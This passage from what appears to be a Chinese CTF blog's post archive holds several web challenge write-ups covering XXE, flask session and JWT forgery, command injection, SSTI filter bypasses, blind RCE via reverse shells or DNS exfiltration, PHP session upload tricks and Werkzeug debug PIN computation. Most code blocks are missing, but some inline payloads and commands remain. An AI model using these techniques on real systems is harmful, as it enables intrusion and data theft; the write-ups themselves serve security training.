但是在python中的md5加密一般都是字符串，所以我们要先对int类型进行转换 Login 而我们首先需要通过/cnss/summer/login来获取这个token: 通过python获取到session的token即可： Parse 接下来我们需要访问parse并且执行xxe: 对于parse我们需要做的准备是： 通过python设置SUMMMMMER请求方式 设置UUID请求头，并且通过爆破获得参数 传入参数username和xml 对于请求方式，可以通过Request来进行设置： 对于UUID，我们需要进行md5的碰撞，先写一个md5的加密函数方便我们接下来的操作： 然后写一个md5碰撞： 其实我们已经知道是在parse处进行xxe了，所以我们可以将xml修改一下: 接下来设置请求头，添加我们的UUID、Content-Type等： 最后设置并发送请求 返回： 为了使得好看一些： 可以修改为print(x.json()[‘data’]): 发现fl444444g 但是我们尝试使用时，会返回： 说明该文件是我们无法通过file来进行读取的 但是我们读取/etc/passwd的话，它是能够正常读取： 所以说我们总体思路是没有问题的，问题在于flag是不能正常读 联系到我们还有个/doCmd没有使用 以及hint Revese Shell 所以我们应该是需要去访问/doCmd然后进行反弹shell操作 考虑到/doCmd的访问方式是限制0.0.0.0（或者127.0.0.1），端口限制在5000 所以我们可以通过xxe访问内网： 同时利用quote库使得我们的command能够正常被引用： 只需要command处执行反弹shell即可 死于没有vps，做不了这一步T_T 完整exp: 后面就是反弹shell后的操作了 其实这是2022的原题，完整操作参考： [CTF]2022 CNSS夏令营 Web&amp;Reverse 复现wp - Tim厉 - 博客园 (cnblogs.com)"},{"title":"NSS Round 13","date":"2023-06-04T09:52:00.000Z","url":"/posts/4670.html","tags":[["Web","/tags/Web/"]],"categories":[["CTF","/categories/CTF/"]],"content":"是赛后靠wp自己复现的，可以划走了 flask?jwt? 看到提示就知道有可能是jwt伪造了 但事实是自己做的时候并不是这样 哈哈，这里是用了flask的session伪造，乐 注册个账户先： 就随便写邮箱号，用户名，密码 然后登录，burp suite抓包，发现了session: 进入jwt.io试图解码jwt，但是 居然不是jwt格式。。 所以想到是不是flask的session 使用flask-session-cookie-manager-master试试 这里使用的是不带secret-key的解密方式，可以看到能够正常解码，userid是8 那么secretkey在哪呢？ 这个问题困扰了我很久，直到我找到了一个重置密码的页面： 这里打开f12就找到了我们的secret-key：th3f1askisfunny 总结就是百密一疏，万万没想到把secretkey藏在这里了… 拿到secretkey直接重新解密： 那我们接下来重新加密session： 这里我之前一直尝试user id是不是改成admin，但是结果不是，改成admin后直接500 Internal Server Error 后来还是我自己尝试是不是把userid改成1就行了，结果真是 … 只能说带点运气成分在里面了 重新登录，将session替换即可获得flag： 然后，赛后出题人来说这是非预期解（雾 flask?jwt?的预期解 这里的正确姿势是需要我们进行jwt伪造，重置admin账户的密码，以admin的身份进行登录并获取flag 这里的重置密码页面会发送重置密码的邮件 我们通过重置密码的连接可以获得jwt，重置链接的格式是这样的： /changePassword/&lt;jwttoken&gt;?email=&lt;youremail&gt; 同时secretkey仍然是那个th3f1askisfunny 这个时候使用secretkey重新伪造jwt，覆盖后就能够重置admin的账户(题目中给出admin的邮箱是adm1n@flag.com) 重新修改admin的密码登录即可获取flag flask?jwt?(hard) 这题我研究了一半，没想到通过删除session引发报错能够获取secretkey 同样注册登录，在拿flag前发现了注释： 访问/wor 发现只给了一段提示： 抓包获取flask session后解码的结果是： 居然和我们flask session里的内容的时间是一致的 那这是什么神奇的魔术呢？ 这里怪我脑子不好使，还是做题做少了，当时做题的时候没想出来 这里肯定是flask读取了我们的session然后获取了time咯 那我们将session删除试试呢？ 会发现我们直接进入报错界面了： 浏览报错界面直接发现了secretkey： 直接进行decode测试： 重新加密即可，userid应该同样是改为1： 这里如果不删掉后面的time 的话python会报错。。。 复制session即可获得flag: 同样地，获取到的secretkey同样也是jwt的secretkey，采用上面的预期解的方法做同样能够获取flag ezfactors …看完前面句号的东西我还认真的去社工了一下，发现并没有这种东西 这里的tool可以点击，进入后发现： 修改数字可以看到不同的数字的因数被分解 搜索了一下，发现linux确实有factor这个指令用于因数分解，而且分解的结果与页面的结果一致： 那这里就有可能就是直接一个命令执行，factor + 传入的参数 对于传入的参数没有作限制，所以可以尝试直接命令执行： 这里后面的/要进行url编码，否则会报错(产生歧义，会认为你访问的是/factors/1234;cat /flag这个路径) 居然真的执行成功了。。 但是flag不可能是这个格式，很明显结果只能够显示数字和冒号还有空格 那我们需要找一个方式能够读取flag的全部内容并且是以纯数字的方式输出 这里采用od，od能够将内容读取并且以8进制的方式返回，此时就是纯数字了 拿到cyberchef解码即可： 这题赛时没做出来（（ 因为自己就是在想linux有什么爆破因数的工具的rce然后进行漏洞利用。。 然后找不到，没想到居然是factor这个命令 其实这里做完就会发现这题跟ping命令是差不多的，同样是加分号后直接跟命令执行即可 MyWeb 这题只能怪自己不肯静下心来好好钻研了。。 源码： 在这里重新梳理一遍源码： mode有save和read 先看read，read模块比较简单： 通过eval函数处理json格式并且输出，这里使用eval函数处理还是比较危险的，如果我们在$data里的内容是: 的话，就能够同样执行commandshere的命令，考虑在data处下手 然后再看save，通过传入value把value写入data.json内，然后保存 这里传入的value经过addslashes处理(单引号，双引号会被添加反斜杠，所以这里不能使用带引号的rce) 这里将代码copy并进行本地测试： 稍微修改了一下源码： data.json内容： 注意到写入data前的操作：先获取data.json的内容，将$data的]直接替换成'$value']，也就是说操作的时候写入是这样的，假设传入的value是6666: 漏洞就出在这里了，简单地说就是直接将传入的value直接拼接在尾部 假设我们传入的是: ]//呢 那json的内容就会变成： 从vscode里看到后面直接被注释掉了，前面完成了闭合，而且read能够直接读出内容： 这里就类似于sql注入了，通过闭合后面的]从而成功执行自己的命令 接下来只需要用分号将命令间隔开并且执行自己的命令即可 由于接下来的内容都被//注释掉了，这里需要新开一行添加; 也就是: 这里好像是靶机寄了，做不出来… 信息收集 … 做不了一点 dirsearch扫到了index.php/login和/cgi-bin/testcgi和/cgi/bin/printenv 然后外加提示说搜索的不是dirsearch(( 然后我意识到可能是让我去找某些cve了 乐 由于搜到的是cgi那边的，所以我就尝试去找了cgi-bin的漏洞 CVE-2014-6271 shellshock 还真有。。 然后直接尝试用它的poc，发现并没有运行这个脚本。。 要开启的话还需要我们chmod 775… 并没有办法执行chmod 775 这个方法就寄了 然后查看了index.php/login 是任意文件读取： wappalyzer解析是apache 2.4.10，那就只能再找找apache 2.4.10的漏洞了 这部分现在是我现看先学的 然后burp抓包的结果的apache却是2.4.55 找找2.4.55的漏洞： CVE-2023-25690 Apache HTTP Server 请求走私漏洞 分析与利用_黑客技术 (hackdig.com) …真有 我们详细看看这篇CVE的解析： 我对于这里的解读大概是这样的： 先通过读取conf/httpd.conf Apache默认安装httpd.conf在哪里？-Java 学习之路 (javaroad.cn) 这篇文章讲述了路径在哪： /usr/local/apache2/conf/httpd.conf 看到Rewrite rule的路径，这里的意思就是将请求的内容转发到/hello/*的路径（应该是 回到这里，我们的Rewrite rule是这样的： 再回到CVE分析的文章，查看利用的方式，大概就是打断点（ 那我们直接看利用方式： 修改一下payload: 即可获取flag 至于为什么是/flag.txt 当然是猜的（可以看出我就把hello改成了nssctf而已） TimeTrcer 不会 看了许多师傅的wp，然后自己再尝试复现而完成的这篇博客，非常的没有营养… 在此po出各位师傅写的wp，毕竟我是靠着他们才能写出这篇文章的： F12师傅 c4skg师傅 ph0ebus’s Blog gtg’s infoSec blog | NSSCTFround13WP-TimeTrcer "},{"title":"CISCN 2022 online_crt题解","date":"2023-06-01T11:23:27.000Z","url":"/posts/28425.html","tags":[["Web","/tags/Web/"]],"categories":[["CTF","/categories/CTF/"]],"content":"又是go和python的结合啊（（ 今年的CISCN好像也有一道go+python的(go_session) NSS上提供了附件，先看看附件怎么写的吧： app.py flask里有如下几个路由： /：主页 /getcrt：调用get_crt函数获取crt(证书) /createlink：使用c_rehash方式使得openssl在证书目录中能够找到证书 这里通过搜索c_rehash能够得知有OpenSSL 命令注入漏洞(CVE-2022-1292) 这个漏洞的利用方式是如果证书的名字有反引号的话可以执行命令： /proxy如同他的名字，通过uri传入表单访问内网8887端口的服务 8887端口是什么服务呢？ main.go: go服务开在8887端口，也就是说我们可以通过/proxy来访问8887 8887是rename操作，也就是说我们可以通过重命名crt的方式来将crt命名成带反引号能够命令执行的方式，再通过/createlink的c_rehash执行命令，获取flag 思路如下： 一些问题及解决 Host 这里的访问host为admin并且rawpath不为空才能够进行Rename操作 但是我们可以从app.py的/proxy路由得到 这里的User-Agent设置为了Guest 但是我们可以控制uri的输入，这里可以通过自行构造Host: admin来使得host为admin RawPath 认识GO语言url.URL结构体 - 谈一些有趣的编程 (ipeapea.cn) 可以看到两个例子 这里的url.Parse类似于php的parse_url() 第一个例子输出的时候RawPath为空 第二个例子把home后面的斜杠变为%2f后，RawPath便不为空了 这就是说，如果有%2f的话，RawPath就不会为空 即，在url任意一个/进行url编码即可绕过 get表单 由于app.py获取的是form，也就是表单的形式（Burp抓包） 所以我们需要加入:Content-Type: application/x-www-form-urlencoded 我们需要访问rename，所以构造的表单的总体形式是这样的： 换成get传参就是： 解题 先直接GET访问/getcrt获取一张证书 然后访问proxy，传入 再访问/createlink 这样执行c_rehash static/crt/ &amp;&amp; ls static/crt/ 所以这里读取的就是static/crt内的目录 说明flag.txt存在了static/crt下 接下来访问static/crt/flag.txt即可获取flag "},{"title":"ctfshow周末大挑战 - parseurl","date":"2023-05-15T04:37:46.000Z","url":"/posts/22097.html","tags":[["Web","/tags/Web/"]],"categories":[["CTF","/categories/CTF/"]],"content":"今天看到ctfshow上有个周末大挑战啊，来做做 认识parse_url() 根据php的函数介绍： parse_url是对传入的url进行语法分析，然后返回url的每个部分： 如果prase_url后带第二个参数，则是直接获取结果的一部分： 参数2的可选值： 具体例子如下： 其中还缺少了一个[fragment]=&gt;test 我本地跑的时候显示不出来，但是这个组成部分还是存在的 parse_url后就可以分成如上的scheme、host、user、pass、path、query、fragment七个部分 第一关 这题就非常简单了，获取parse_url()的host部分然后进行eval 那直接在host处下手即可： 命令执行成功 尝试使用ls /失败 那就得用cd ..;ls 逐级寻找flag 发现flag: 第二关 改为了包含host和path 如果知道了文件的路径，直接包含获取即可 如果不知道可以通过data伪协议包含写入shell: 最终payload： 然后就可以进行命令执行： 另：既然知道了flag的路径 那直接： 乐 第三关 同上，只不过改为scheme和path拼接 将scheme从http://改为data:: 然后发现data后面的内容全部为path了，也就是： 所以直接写： flag的开头还是以下划线开头的 所以直接 第四关 和第一题一样啊 host改一改命令执行即可 换到靶机就是： 发现flag 1_f1ag_1s_h3re : 第五关 套娃： include 还是用data协议写shell 那这个$$$$$$host又是什么东西呢？ 其实就是套娃 如果$host指向1 那就会变成$$$$$1 ，消掉一个1 如果1指向2 那就会变成$$$$2…以此推类 这里通过parse_url获取url各部分: host scheme username password port path query fragment 那就可以通过这八个进行上述的套娃，从而指向最后的data伪协议： payload: 第六关 看到file_put_contents写shell: 对回去就是： 将path做文件名，host作为data写入 本地测试： 也就是说它把问号后面的内容定义为了query 所以我们要找一个不带问号的webshell： 使用js的webshell： payload: 访问1.php后： (完)"},{"title":"flask ssti的新姿势","date":"2023-04-16T06:33:25.000Z","url":"/posts/25410.html","tags":[["Web","/tags/Web/"]],"categories":[["CTF","/categories/CTF/"]],"content":"这个题是最新最热的GDOUCTF里面出的一个题&lt;ez_ze&gt;的姿势 偷偷来学一学： 打开靶机后看到的是一个post窗口，刚开始怀疑是sql注入，但是做着做着发现不对劲，应该不是sql，是ssti 随后我用dirsearch扫了，发现有个/console 进去就是flask的后台（（ 所以很明确就是flask了 can can 过滤 首先测试了&#123;&#123;7*7&#125;&#125; 回显是invalid input 将花括号去掉，显示7*7 再单独输入花括号回显invalid input 过滤了花括号 经过测试应该是绕过了至少： &#123;&#123;` 、`\"`、 `_`、`\\`、`class`、`popen`、`.`、`[]`、`os` 但是很搞笑的事就是 我想要跑个fuzz字典来着，发现没有ssti的字典... &#123;%asset_img 2.png bwb%&#125; 反正这些都被过滤了，常见的一些绕过方式也没有办法（比如request.args，通过传参绕过下划线、用中括号替换点号、等等） 但是还是有绕过的方法的： # 绕过原理： `dict()|join`：python中的字典 将字典中的key值进行拼接 `&#123;&#123;set p1=dict(p=a)|join&#125;&#125;就是令p1=p 如果后面加|count变成dict()|join|count的话就是返回该字符串的长度： &#123;&#123;set p1=dict(c=a)|join|count&#125;&#125; p1=1 通过这样的拼接可以获取到payload 花括号替换：&#123;%%&#125; payload: 先获取数字0-9（没有过滤数字，其实可以不用这么做） 通过获取pop来获取下划线：(pop能够将索引值删除列的某个元素并将该元素返回) 返回 其中便有下划线，通过pop删除第18（或者24）即可返回_ 通过join拼接下划线和globals即可： 获取get： 获取os: 获取builtins: 获取popen: 如果使用上面的拼接会报错：keyword repeated 这里可以使用+拼接： %2b即为加号 获取chr函数来获取flag： 命令cat /flag： 用chr() -&gt; 字符即可 获取read: 总payload： 也就是： 最后多打了个&#123;%print read%&#125; 所以上面显示多了一个read "},{"title":"看看无回显RCE","date":"2023-03-11T08:46:16.000Z","url":"/posts/50751.html","tags":[["RCE","/tags/RCE/"]],"categories":[["CTF Web","/categories/CTF-Web/"]],"content":"学到了一点点新东西： 1.什么是无回显RCE 简单说来应该就是和sql注入里的盲注一个概念，你看不到回显的结果是什么 就比如eval函数，他就是一个有回显的函数 但是exec()就是一个无回显的函数，你看不到结果是什么 2. how 2 solve it? 对于无回显的rce一般有三种解决方式： 反弹shell dnslog外带数据 时间盲注 反弹shell 使用bash或nc反弹 dnslog外带数据 使用： ceye 使用;作为命令的分隔符，然后发起curl请求 收到外带数据回显结果 不过这个b玩意太容易504 Gateway Time-out了… 等能访问的时候再补充图片吧 使用方法： 注册了一个账号以后就会有个属于自己的dnslog域名 然后： 如果使用dnslog.cn dnslog 要这么写： 可惜由于dir/ls会被空格截断 可以加上|sed -n '1p’来查看 … extra: 还可以使用burp的Burp Collaborator Client 点击Burp就有Burp Collaborator Client了 点击copy to clipboard 会生成一段：ucamo87yesi3j87kf879es5cn3tuhj.burpcollaborator.net 然后payload： tee：从标准输入读取，再写入标准输出和文件 时间盲注： 使用sleep 不过我在nssctf上没成功（（（ 所以这里就不多展开"},{"title":"一道题学习两个知识点","date":"2023-03-04T05:42:27.000Z","url":"/posts/13237.html","tags":[["Web","/tags/Web/"]],"categories":[["CTF Web","/categories/CTF-Web/"]],"content":"说点题外话，就是今年的安洵杯老逆天了这件事 其实我连账号都没有的（（ 懒狗本质，懒得去注册账号 然后看到群里发的比赛链接，欸，怎么连都进不去 容器环境也打不开… 还是得靠thai神 然后thai神光速做完web1下班，后面就没见到题目解了= = 额，这段话的意思就是很离谱，只能打开第一题的环境… 后面就更搞笑了 比赛直接给paused了，笑死 然后群里都在说这一届安洵杯就是个离谱杯 知乎一看： Web： 5秒最多10次请求 开局500 公共环境静态flag Misc：套题 Crypto： misc 简单的密码学不给附件 re：原题 甚至没有pwn 甚至还有开盒，收集学生信息 不过知乎说他们没少看p神文章还挺对的 web 1 就考的两篇p神的文章(( 不吹水了，来看看web1 好像忘记源码了… 大概就是get传参名为heizi，开头前5个字符限制为aikun 最后10个字符限制为xiaojijiao，如果字符串为aikunxiaojijiao输出nonono 否则进入下一层 下一层考的是p神的PHP利用PCRE回溯次数限制绕过某些安全限制这篇文章 源码应该是这样的： 如果输入的是aikunaaaaaxiaojijiao的话 .+?匹配到a 由于是非贪婪模式.+?停止匹配，由s匹配a（第二个a） 匹配失败，回溯到.+?匹配第2个a 然后停止，s匹配第三个a … 随着a的数量增加，回溯次数越来越多，但是回溯次数的上限是100万次，如果超出了这个回溯次数就会返回false 所以我们直接用python打印100万个a写在里面就好了 print('a' * 1000000) 随后进入第二层 这篇就是p神的 我是如何利用环境变量注入执行任意命令 其语句为： 在CentOS 8下安装PHP，并使用本文开头的代码，直接运行一个测试服务器： 而在Bash 4.4以前是： 所以直接打就是了 不过这里得绕一下blacklist的限制 可以使用空变量绕过： "},{"title":"看看session.upload_progress","date":"2023-03-04T05:12:51.000Z","url":"/posts/42409.html","tags":[["Web","/tags/Web/"]],"categories":[["CTF Web","/categories/CTF-Web/"]],"content":"这个东西让我印象挺深刻的（ 最近一次接触还是在一道SQL注入的题目： [PwnThyBytes2019] BabySQL 由于login.php没有session存在的时候就不能访问，并且无法注入 所以这时候就需要我们自己创造一个session 所以session_upload_progress在这里就派上用场了 然后我就想起来之前session反序列化的时候好像也是用这个session_upload_progress的 觉得这个东西挺有用的，就来学习一下 还有就是这个了（雾） 1.绕过!isset[$session] 就是上面的引子引入的题目，不多赘述 2.session反序列化 session序列化/反序列化的默认引擎是php 但是如果php文件变成了： 就将序列化的引擎改变了（php_serialize） php引擎对于序列化的存储格式是：|serialized_string，而php_serialize引擎的存储格式是serialized_string，如果使用两个引擎分别处理的时候就会出现问题 这是因为php_serialize会将|当作正常字符来解析，生成session，php中会将|看作分隔符，解析session文件时会直接对|后的值进行反序列化处理（session_start()） 如果存在两种不同的引擎的时候，就可以利用session_start()的自动反序列化传输数据 此时当浏览器向服务器上传一个文件时，php将会把文件上传的详细信息存储在session当中；只需往该地址POST一个名为PHP_SESSION_UPLOAD_PROGRESS的字段，就可以将文件名的值赋值到session中，进行session反序列化 前提当然是session.upload_progress.enabled为On 简单看一个以前做的题就知道了 （ctfshow新手杯-石头剪刀布） 源码可以看到__destruct()魔术方法里file_get_contents()这一个危险的函数 可以想到用反序列化获取flag 虽然整个源码没有unserialize()函数，但是源码开头将序列化反序列化引擎设置为了php，通过phpinfo()可以看到默认处理器是php_serialize，且session.upload_progress.enabled已经打开 所以这里就可以通过尝试上传session进行反序列化 先进行反序列化，这个反序列化连我都能看得懂( 然后post传个文件： 发包过去就好了 3.文件包含 1.如果session.auto_start=On的话，即使没有session_start()也会对session进行初始化，但是默认关闭 由于session.use_strict_mode默认值为0，导致用户可以自定义Session ID（Cookie: PHPSESSID= xxx） 这个时候PHP就会在服务器上创建一个文件/tmp/sess_xxx 这个时候PHP会自动初始化session，并且将文件名等内容写入sess_xxx文件中 其实就是这个： upload_progress_xxx 这个xxx其实就是命令执行之后的结果 然后序列化的结果就是文件的一些详细信息，包括文件名，上传时间等 也就是说如果我们此时包含了这个文件，这个文件写入了eval()的话就可以进行rce 但是由于session.upload_progress.cleanup = on使得上传的sess_xx会被立即清空，此时在session文件内容清空前包含即可 script: 如果是利用 burp 发包的话 你需要准备一个session的包（包含有PHPSESSID和PHP_SESSION_UPLOAD_PROGRESS的那个包），然后一个文件包含包(?file=/tmp/sess_id的那个) 同时发包，赶在sess_id文件清除之前访问即可"},{"title":"HSCCTF 2th WriteUp","date":"2023-02-19T03:30:24.000Z","url":"/posts/37685.html","tags":[["Web","/tags/Web/"]],"categories":[["CTF WriteUp","/categories/CTF-WriteUp/"]],"content":"又被薄纱了，哈哈哈 Misc SIGNIN 关注公众号：中龙 红客突击队 发送：HSCCTF{TELLMEFLAG}获取flag即可 Crypto EZRSA 尝试factordb分解失败 但是M=2022mep=k1p n=pq=k2p c = M^e mod n = (k1p)^e mod k2p =k3p mod k2p = k3p-k4k2p 结果是 n，c都含有p的因子 所以n和c的最大公因数就是p 得到p之后就可以得到q 之后就是rsa常规解法 Web EZSSTI ssti模板注入，传参点是name 直接使用poc一把梭： 但是发现报错： 对比发现popen被删除了，所以这里直接双写绕过即可 回显： 应该是有过滤cat 所以换成nl EasyPHY 第一眼进去还以为是文件上传，于是传什么文件都被挡… 后来发现：&lt;input type=&quot;submit&quot; name=&quot;acti0n&quot; placeholder=&quot;上传图片&quot; value=&quot;upload&quot; class='btn' id='b1'&gt; name=acti0n… 所以应该是有传参点的，那么我们可以尝试获取view和upload的源码（文件包含） acti0n=php://filter/convert.base64-encode/resource=view.php 发现被挡了，可以大小写绕过 acti0n=php://filter/convert.basE64-encode/resource=view.php 可以看到ban掉了很多危险函数 而view.php内能够明显看到在__destruct()方法内有eval函数 而__destruct()明显是反序列化的标志，而该方法又在delete_img函数内 而如果delete作为post参数的时候，就会将其内容传递到delete_img函数内，再加之上传文件，所以应该是phar反序列化 运行后获得phar.phar，将其上传即可 然后通过post的delete触发phar即可 delete=phar://phar.phar EZFlask Flask pin码攻击 不过这个东西最恶心的地方就在我找到的几个脚本里生成的pin码都是错的… 都不知道什么原因… 什么是flask的pin码攻击呢？ 简单的说就是你可以通过报错的页面进入debug模式，直接获得控制台（ 但是一般都会被锁定，并且让你输入pin码 而我们的pin码攻击此时就要派上用场了，我们可以通过计算获得pin码并且解锁 如何进行pin码的计算： 你要获取以下几个东西： 机器的mac地址：可以通过访问/sys/class/net/eth0/address获得 机器id：访问/etc/machine-id或者/proc/sys/kernel/random/boot_id，二选一 CPUID:/proc/self/cgroup或者/proc/1/cpuset modname：默认为flask.app 用户名：访问etc/passwd获得 app.py的绝对路径：通过报错页面获得 然后使用脚本计算即可 解题： 页面提示：/view?filename=app.py，输入后获得app.py的源码 猜测我们可以通过filename来进行文件的读取，并且如果我们直接访问/view页面会报错，通过报错页面我们获得app.py的绝对路径：/usr/local/lib/python3.8/site-packages/flask/app.py 通过/view?filename=/sys/class/net/eth0/address获取机器mac地址：02:42:ac:02:0b:47 通过/view?filename=/etc/machine-id获得机器码：7265fe765262551a676151a24c02b7b6 通过/view?filename=/proc/1/cpuset获取CPUID: 2b577240d0290d4743c464cf4a8375c8c1a52d7eae4545baaf602d2577177a70（docker后面的一串） 通过/view?filename=../../etc/passwd获取用户名： app 也就是bin/sh的前一个 那直接上脚本即可： 直接复制819-831-805即可，有时候不能认证，尝试重新打开一下页面即可 获取到控制台了 那直接想怎么做就怎么做： 发现flag和readflag 先查看flag，是空的 然后查看readflag获得flag "},{"title":"CTFShow 菜狗杯","date":"2023-01-29T03:26:32.000Z","url":"/posts/37693.html","tags":[["Web","/tags/Web/"]],"categories":[["CTF Web WriteUp","/categories/CTF-Web-WriteUp/"]],"content":"做做菜狗杯的题（主要是web） Web签到 源码如下： 这个刚开始看的时候可能头很大，实际上就是变量的嵌套 由里到外传参即可： 第一层是cookie传参：名为CTFshow-QQ群: 值为1 这样就变成了eval($_REQUEST[$_GET[$_POST[1]]]) 相当于让我们POST 名为1的值 此时令1=2 变成eval($_REQUEST[$_GET[2]]) 同上，get传参2=3 最后的request用任意方式传参即可，注意后面的中括号 3[6][0][7][5][8][0][9][4][4]=system('ls /'); 注意中文需要url编码 发现f1agaaa，直接cat /f1agaaa即可 web2 c0me_t0_s1gn 提示：the page hide something you need use the god’s eye to find 使用F12发现： 提示我们看看控制台： 运行这个函数即可获得flag 直接控制台输入g1ve_flag() 我的眼里只有$ 非常简单的代码，通过POST请求覆盖变量： 一共有36个$ 所以直接cat /f*即可 一言既出+驷马难追 这个题可以有两种方法： 1.将后面的内容注释掉（通过注释符，因为没有对输入进行过滤） 只需要将==1919810及其后面的内容注释掉即可 ?num=114514);// 传入后assert内容变为了 也就是intval 114514 然后输出flag 2.assert()类似于eval()，可以执行加减乘除 所以只需要114514+1805296即可 加号需要url编码 ?num=114514%2B1805296 （驷马难追中使用） TapTapTap js游戏题，关注： 1.js是否有alert 2.游戏取得胜利的条件 3.角色参数（ 在/js/habibiScript.js中找到alert(atob('WW91ciBmbGFnIGlzIGluIC9zZWNyZXRfcGF0aF95b3VfZG9fbm90X2tub3cvc2VjcmV0ZmlsZS50eHQ=')); 通过base64解码得到 Your flag is in /secret_path_you_do_not_know/secretfile.txt 直接访问获得flag WebShell 非常简单的反序列化 只需注意过滤了flag即可 执行后打开f12即可看到flag 化零为整 所以这个题目就是让我们通过多次get传参拼接出大牛 由于每一个url编码长度只占1 所以我们可以将大牛进行url编码，每一个get传参只传递其中一个编码，拼接后解码就能组成大牛 将大牛url编码：%E5%A4%A7%E7%89%9B 传入?1=%E5&amp;2=%A4&amp;3=%A7&amp;4=%E7&amp;5=%89&amp;6=%9B即可 无一幸免 不是很懂，get随便传都行 ?0=即可 传说之下（雾） 还是js小游戏 直接看看js： 这里没有alert什么的输出条件… 就看看分数，发现var nowScore = this.score += 1 就是每吃一个苹果得到1分 我们直接改成2077+就行了 控制台输出flag 算力超群 打开是个计算器 但是随便输点算术没有其他的回显 打开burp抓个包 抓到了： 接下来对这三个参数进行修改： 删除number1的参数： 页面报错，发现是app.py(flask) 并且最后的内容是eval函数 说明我们可以对传入的参数进行修改执行命令（ 算力升级 仅能使用gmpy2库的函数进行注入 查看源码 查看gmpy2库内的内容 builtins内一般有eval（ssti) 查看后确实有 只需要成功调用eval即可再次使用上一题的payload获取flag 也就是最终结果是 所以我们可以使用gmpy2库内的函数获取出所有的英文字母从而拼接出payload （注意单引号需要使用双引号，就像这样 “'”） 经过不懈努力后得出如下payload Is_Not_Obfuscate 打开网页是一个push 和 pull的界面，首先查看源码： 发现了一段被注释的内容：action=test的时候会执行内容 并且是eval执行 发现了lib.php和index.php 提示访问index.php前首先要测试lib.php 还有robots.txt 先访问robots.txt 发现/lib.php?flag=0，并且直接访问lib.php页面无内容 于是尝试将flag修改为1，回显出一套神秘代码 我也不懂什么东西，起初我还以为是base64，所以去用cyberchef搞了一下，发现不行 然后源码处知道将action设置为test后可以解密文件 于是将加密文本解密 于是成功回显源码 其中最重要的就是下一段了 于是我们可以output写入命令，然后进行push 然后使用pull操作访问这个文件，执行其中的命令 第一步： 第二步： 其中1ce4b066a901b6cb2f7905584ff31ad4是system('cat /f*');youyou的md5值 就能获得flag easyPytHon_P 直接给出源码如下： 值得注意的就是： request.form.get说的是虽然是get，但是其实使用post方式提交的 真蛋疼啊… 然后就是这个subprocess.run()了，它是用于执行指定的命令，等待命令执行完成后返回一个包含执行结果的CompletedProcess类的实例 函数参数： subprocess.run(args, *, stdin=None, input=None, stdout=None, stderr=None, shell=False, timeout=None, check=False, universal_newlines=False) args：默认是字符串序列 也可以是一个字符串，但是此时要将shell参数设置为true shell：如果为true，则命令将会通过shell执行 check：检查异常 举个例子： 从这里我们就可以知道这些个字符串需要分开 也就是我们想要执行ls -l 就需要分开传递ls 和-l 所以就是换个方式来执行命令 POST方式传入：cmd=ls&amp;param=/ 查看根目录下是否有flag 发现没有，所以flag应该在当前目录/app下 经过测试发现如果param为空无回显 所以我们传入cmd=ls&amp;param=/app查看/app下的文件 发现flag.txt 直接cat flag.txt即可 满地飘零 但事实呢，这题考的不是变量覆盖，因为如果你传值?flag=zeros的时候就只会echo “好多零”，而且flag原本的值也被覆盖了 我们知道$号后面是变量名 那么$_GET呢？ 那么我们是不是可以这样理解：$_GET不仅仅是GET传参，还可以是个变量名_GET？ 那么我们如果传入_GET=flag的话 那么$_GET=$flag 而且没有进入好多零，而是var_dump()，就能获得flag了 茶歇区 int64溢出 消耗fp得到物品 每一件物品有不同的分数 消耗的fp值超过你有的fp值的时候就会回显你不好意思拿那么多… 那么如果我们硬要拿很多的话，就会使得扣除的分数溢出，导致无法处理（ int 64 : 9223372036854775807 如果我们超过了这个数字，int就无法处理了 然后就是试错，拿咖啡试是最好的，因为他是x10 矿泉水是无法触发溢出的，因为x1 我们试试 9223372036854775807 发现我们获得了0分 这个时候就是溢出太大了（ 我们调整一下 932337203685477580 这样恰好溢出不会太大 操作成功：你拿了932337203685477580瓶咖啡，总计获得-9123372036854775808分! 回显成功，再传一次932337203685477580即可获得flag 感觉怪怪的，说不太清 恭喜你获得flag：ctfshow&#123;4d69f484-1089-4e02-8437-9726728942bd&#125; 无一幸免_FIXED 这里修复了bug（ 考的还是整型溢出： $arr[]=1就是让数组追加一个新的下标，然后令他的值为1 也就是说我们输入什么数字，他的下一个数都是1 判断永真，进入不了else 但是如果它超过了整型最大值的话，数组就会处理异常 因为数组的最大下标数=最大int数 追加的话会导致整型溢出，追加失败 进入else 那直接传入0=9223372036854775807即可 这个时候就会报错：**Warning**: Cannot add element to the array as the next element is already occupied in **/var/www/html/index.php** on line **7** 并且进入else语句ctfshow&#123;2520e3b6-c6de-4205-9f8a-60565aa79691&#125; 小舔田? 反序列化 目标：echo $flag 需要触发call()函数，并且nickname=“小甜甜” call()函数由__toString()魔术方法触发，而__toString()又可以由 Moon类触发 那就可以了 当然，nickname是弱比较 我们让nickname=0（int）和字符串比较，也是可以的 不过这个后面就比较怪了… LSB探姬 【ctfshow菜狗杯-LSB探姬】 抽老婆 像catctf的 catcat，比catcat简单 直接抽一个老婆，然后查看源码 在下载老婆处找到了/download?file=3e5b0bcb240126f92e31206528fa81ff.jpg 就是通过file=文件名进行下载 尝试修改一下文件名，改为1，页面报错，同时发现是flask模板（/flask/app.py） 所以我们尝试下载app.py查看源码 file=../../app.py 可以发现flag在/secret_path_U_never_know处，但是他又需要session的身份验证 所以这个时候就需要我们伪造session了，详见CatCTF的catcat 我们首先获取我们当前的session，打开bp抓包： 然后通过flask-session-cookie-manager伪造session即可 伪造session需要知道secretkey，而在这里已经提供了secretkey：tanji_is_A_boy_Yooooooooooooooooooooo! 先使用decode解码内容： python.exe .\\flask_session_cookie_manager3.py decode -c 'eyJjdXJyZW50X3dpZmkiOiIzZTViMGJjYjI0MDEyNmY5MmUzMTIwNjUyOGZhODFmZi5qcGciLCJpc2FkbWluIjpmYWxzZX0.Y-UDjg.2I1zjYEctpdz93Wi_YcLVmgBrAg' -s 'tanji_is_A_boy_Yooooooooooooooooooooo!' 解码内容：&#123;'current_wifi': '3e5b0bcb240126f92e31206528fa81ff.jpg', 'isadmin': False&#125; 然后进行加密： python.exe .\\flask_session_cookie_manager3.py encode -s 'tanji_is_A_boy_Yooooooooooooooooooooo!' -t &quot;&#123;'current_wifi': '3e5b0bcb240126f92e31206528fa81ff.jpg', 'isadmin': True&#125;&quot; 获取session： eyJjdXJyZW50X3dpZmkiOiIzZTViMGJjYjI0MDEyNmY5MmUzMTIwNjUyOGZhODFmZi5qcGciLCJpc2FkbWluIjp0cnVlfQ.Y-UG7Q.K3pbEVAqAZZFU1upOI_Zn4Rpj7c 然后替换session再访问/secret_path_U_never_know即可 龙珠nft我没做出来（（（ 完 CTFShow 